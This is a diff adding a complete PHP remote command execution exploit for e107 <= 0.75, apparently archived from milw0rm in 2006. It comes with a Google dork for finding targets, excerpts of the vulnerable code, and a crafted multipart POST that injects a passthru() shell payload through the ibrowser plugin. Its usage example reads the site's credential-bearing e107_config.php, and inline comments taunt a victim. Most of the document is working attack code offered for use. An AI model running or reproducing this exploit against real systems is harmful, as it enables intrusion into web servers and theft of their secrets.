@@ -1,0 +1,192 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+--------------------------------------------------------------------------------
+e107 <= 0.75 GLOBALS[] overwrite/Zend_Hash_Del_Key_Or_Index remote commands
+execution exploit
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dork: "This site is powered by e107"|inurl:e107_plugins|e107_handlers|e107_files
+--------------------------------------------------------------------------------
+');
+/*
+works with register_globals=On
+against PHP < 4.4.1, 5 < PHP < 5.0.6
+*/
+if ($argc<4) {
+print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to e107
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /e107/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost /e107/ cat ./../../../../e107_config.php -p81
+--------------------------------------------------------------------------------
+');
+die;
+}
+/*
+software site: http://e107.org/
+
+vulnerable code in class2.php near lines 29-37:
+...
+// Destroy! (if we need to)
+if($register_globals == true){
+	while (list($global) = each($GLOBALS)) {
+		if (!preg_match('/^(_POST|_GET|_COOKIE|_SERVER|_FILES|GLOBALS|HTTP.*|_REQUEST|retrieve_prefs|eplug_admin)$/', $global)) {
+		unset($$global); [**]
+		}
+	}
+	unset($global);
+}
+...
+and in e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php near lines 26-40:
+
+...
+require_once("../../../../class2.php");
+if (!defined('e107_INIT')) { exit; }
+unset($tinyMCE_imglib_include); //[*]
+
+// include image library config settings
+include 'config.php';
+
+$request_uri = urldecode(empty($HTTP_POST_VARS['request_uri'])?(empty($HTTP_GET_VARS['request_uri'])?'':$HTTP_GET_VARS['request_uri']):$HTTP_POST_VARS['request_uri']);
+
+// if set include file specified in $tinyMCE_imglib_include
+
+if (!empty($tinyMCE_imglib_include))
+{
+  include $tinyMCE_imglib_include; ///[***]
+}
+...
+
+you can evade [*] by sending the hash keys of $tinyMCE_imglib_include var and
+[**] (this *should* unsets the hash keys...) by sending a multipart/form-data
+request with the "GLOBALS" var
+
+here [***] the code will include the temporary file and execute our shellcode
+
+see http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
+and http://www.hardened-php.net/advisory_202005.79.html
+
+for details about this php vulnerabilities
+*/
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$data="-----------------------------7d529a1d23092a\r\n";            #oh, I want to tell you a story, about a Telecom guy *
+$data.="Content-Disposition: form-data; name=\"tinyMCE_imglib_include\"; filename=\"suntzu\";\r\n";   #that doesn't know *
+$data.="Content-Type: image/jpeg;\r\n\r\n";       #the sovereign art of PHP kung-fu, now is desperate and he's seriously *
+$data.="<?php error_reporting(0);set_time_limit(0);echo 'my_delim';passthru('".$cmd."');echo 'my_delim'; die;?>\r\n";#   *
+$data.="-----------------------------7d529a1d23092a\r\n";            #thinking to kill himself, after he loosed his work *
+$data.="Content-Disposition: form-data; name=\"-1203709508\"; filename=\"suntzu\";\r\n";//and his honour and self-respect*
+$data.="Content-Type: image/jpeg;\r\n\r\n";                           //because of some brave guys that rooted his boxes.*
+$data.="1\r\n";#                                                                                                         *
+$data.="-----------------------------7d529a1d23092a\r\n";              #Now, guy, don't cry anymore, but... do something *
+$data.="Content-Disposition: form-data; name=\"225672436\"; filename=\"suntzu\";\r\n";      #useful, please open the PHP *
+$data.="Content-Type: image/jpeg;\r\n\r\n";                          #manual, like a respectful student. And start to... *
+$data.="1\r\n";#                                                                                                         *
+$data.="-----------------------------7d529a1d23092a\r\n";#                                                               *
+$data.="Content-Disposition: form-data; name=\"GLOBALS\"; filename=\"suntzu\";\r\n";#                                    *
+$data.="Content-Type: image/jpeg;\r\n\r\n";#                                                                             *
+$data.="1\r\n";#                                                                                                         *
+$data.="-----------------------------7d529a1d23092a--\r\n";#                                                             *
+$packet ="POST ".$p."e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php HTTP/1.0\r\n";#                                *
+$packet.="Host: ".$host."\r\n";#                                                                                         *
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";#                   *
+$packet.="Content-Length: ".strlen($data)."\r\n";#                                                                       *
+$packet.="Accept: text/plain\r\n";#                                                                                      *
+$packet.="Connection: Close\r\n\r\n";#                                                                                   *
+$packet.=$data;#                                                                                                         *
+sendpacketii($packet);#                                                                                                  *
+if (strstr($html,"my_delim")){#                                                                                          *
+echo "exploit succeeded...\n";$temp=explode("my_delim",$html);die($temp[1]);                                   #...pray  *
+}
+echo "exploit failed... register_globals=off here or wrong PHP version\n";
+?>
+
+# milw0rm.com [2006-08-28]
